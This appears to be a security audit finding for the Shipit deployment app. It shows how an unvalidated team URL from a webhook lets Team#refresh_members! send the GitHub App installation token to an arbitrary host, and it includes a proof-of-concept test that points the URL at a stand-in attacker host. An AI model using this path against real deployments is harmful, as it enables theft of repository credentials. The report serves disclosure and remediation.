### Title
Unvalidated `Team#api_url` from webhook payload causes GitHub App installation token exfiltration via `Team#refresh_members!` - ([File: app/models/shipit/team.rb])

### Summary
`MembershipHandler#find_or_create_team!` persists `team.url` from the incoming webhook JSON verbatim into `Team#api_url` with no host/domain validation. `Team#refresh_members!` later calls `Shipit.github(organization:).api.get(api_url)`, and because the Octokit client's Authorization header is attached per-request regardless of the target host, the app's live GitHub App installation token is sent to whatever host is stored in `api_url`.

### Finding Description
The broken binding: the Authorization header sent by `github_api.get(api_url)` should equal `Bearer <installation_token>` **only if** `URI(api_url).host` is `github.com` (or the configured enterprise `domain`). In the vulnerable path it equals `Bearer <installation_token>` for **any** `api_url`, including an attacker-chosen host.

Code path:
- `MembershipHandler#process` calls `find_or_create_team!`, which does `Team.find_or_create_by!(github_id: params.team.id) { |team| team.github_team = params.team; team.organization = params.organization.login }` [1](#0-0) .
- `Team#github_team=` sets `self.api_url = github_team.url` directly from the webhook payload's `team.url` field, with no validation that it points at `github.com`/the configured enterprise domain [2](#0-1) . There are no model validations on `Team` (no `validates`/`validate` calls found) that constrain `api_url`.
- `Team#refresh_members!` later does `github_api = Shipit.github(organization:).api; github_api.get(api_url)` [3](#0-2) , invoked from `bin/rake teams:fetch` for every team in `Shipit.github_teams` [4](#0-3) .
- `Shipit.github(organization:).api` returns an `Octokit::Client` whose `access_token` is set to the live installation token via `new_client(access_token: token)` [5](#0-4) . Octokit attaches the `Authorization` header for every outgoing request on that client connection, independent of the target host when an absolute URL is passed to `.get`.

Given the stated precondition (a prior create-time race/injection already poisoned `Team#api_url` to an attacker-controlled URL), any subsequent call to `refresh_members!` — triggered by the operator's `teams:fetch` rake task, not by the attacker directly — causes the app's live GitHub installation bearer token to be sent as the `Authorization` header of a GET request to the attacker's host.

None of the existing guards prevent this: `verify_signature`/`GitHubApp#verify_webhook_signature` only authenticate that a *webhook* payload came from the configured organization; they say nothing about the *content* of `team.url` inside that payload. The `ExplicitParameters` schema in `MembershipHandler` only requires `url` to be a `String`, not that it match a GitHub API host [6](#0-5) . No `Team` model validation restricts `api_url`'s host.

### Impact Explanation
Once triggered, the operator-run `teams:fetch` task (or any other code path invoking `refresh_members!`) sends the app's GitHub App installation access token — the same token used to read/write across every repository the installation has access to — to a host fully controlled by the attacker. This is a Critical-severity credential exfiltration: possession of that token lets the attacker impersonate the Shipit GitHub App across all repositories/organizations the installation covers, not just the repository tied to the poisoned team. The blast radius is tenant-wide (every stack under the affected GitHub App installation), matching the "exfiltration of GITHUB_TOKEN ... deploy-time secrets" Critical category.

### Likelihood Explanation
This specific step (`refresh_members!` leaking the token to `api_url`) is deterministic and requires no special conditions beyond the stated precondition: a `Team` record whose `api_url` has already been set to an attacker-controlled URL, and an eventual call to `refresh_members!` (via the `teams:fetch` rake task, run periodically by operators per `lib/tasks/teams.rake`). The attacker does not need any additional privileges to benefit once the poisoned record exists and the refresh job runs; the leak is repeatable every time `refresh_members!` executes for the poisoned team.

### Recommendation
Validate/allowlist the host of `api_url` (and any other absolute GitHub URL persisted from webhook payloads, e.g. `github_team.url`, `github_user.url`) against the configured GitHub domain (`Shipit.github(organization:).domain`) before storing it, and/or have `Team#refresh_members!` reconstruct the members URL from a trusted template (e.g., `orgs/:org/teams/:slug/members`) rather than trusting a stored arbitrary URL. Additionally, add a `Team` model validation ensuring `api_url` starts with `https://#{domain}/` (or the enterprise API endpoint) for the relevant organization.

### Proof of Concept
```ruby
# test/models/team_test.rb (conceptual addition)
test "#refresh_members! must not send the installation token to a non-GitHub host" do
  team = shipit_teams(:shopify_developers)
  team.update!(api_url: 'https://attacker.example.com/steal')

  stub_request(:get, 'https://attacker.example.com/steal')
    .to_return(status: 200, body: '[]', headers: { 'Content-Type' => 'application/json' })

  team.refresh_members!

  request = WebMock::RequestRegistry.instance.requested_signatures.hash.keys
    .find { |r| r.uri.to_s == 'https://attacker.example.com/steal' }

  # Binding under test: Authorization header sent to attacker host
  # should NOT equal the live installation token's Authorization value.
  live_token_header = "token #{Shipit.github(organization: team.organization).api.access_token}"
  assert_not_equal live_token_header, request.headers['Authorization']
end
```
This test fails against the current code (the attacker host receives the real `Authorization` header), confirming the exfiltration path.

### Citations

**File:** app/models/shipit/webhooks/handlers/membership_handler.rb (L7-21)
```ruby
        params do
          requires :action, String
          requires :team do
            requires :id, Integer
            requires :name, String
            requires :slug, String
            requires :url, String
          end
          requires :organization do
            requires :login, String
          end
          requires :member do
            requires :login, String
          end
        end
```

**File:** app/models/shipit/webhooks/handlers/membership_handler.rb (L38-43)
```ruby
        def find_or_create_team!
          Team.find_or_create_by!(github_id: params.team.id) do |team|
            team.github_team = params.team
            team.organization = params.organization.login
          end
        end
```

**File:** app/models/shipit/team.rb (L45-51)
```ruby
    def refresh_members!
      github_api = Shipit.github(organization:).api
      github_members = Shipit::OctokitIterator.new(github_api.get(api_url).rels[:members])
      members = github_members.map { |u| User.find_or_create_from_github(u) }
      self.members = members
      save!
    end
```

**File:** app/models/shipit/team.rb (L53-58)
```ruby
    def github_team=(github_team)
      self.name = github_team.name
      self.slug = github_team.slug
      self.api_url = github_team.url
      self.github_id = github_team.id
    end
```

**File:** lib/tasks/teams.rake (L5-14)
```text
  task fetch: :environment do
    Shipit.github_teams.each do |team|
      puts "Fetching @#{team.handle} members"
      begin
        team.refresh_members!
      rescue Octokit::Unauthorized, Octokit::NotFound => e
        puts "Failed to fetch @#{team.handle} members. Do you have enough permissions?"
        puts "#{e.class}: #{e.message}"
      end
    end
```

**File:** lib/shipit/github_app.rb (L63-67)
```ruby
    def api
      client = (Thread.current[:github_client] ||= new_client(access_token: token))
      client.access_token = token if client.access_token != token
      client
    end
```
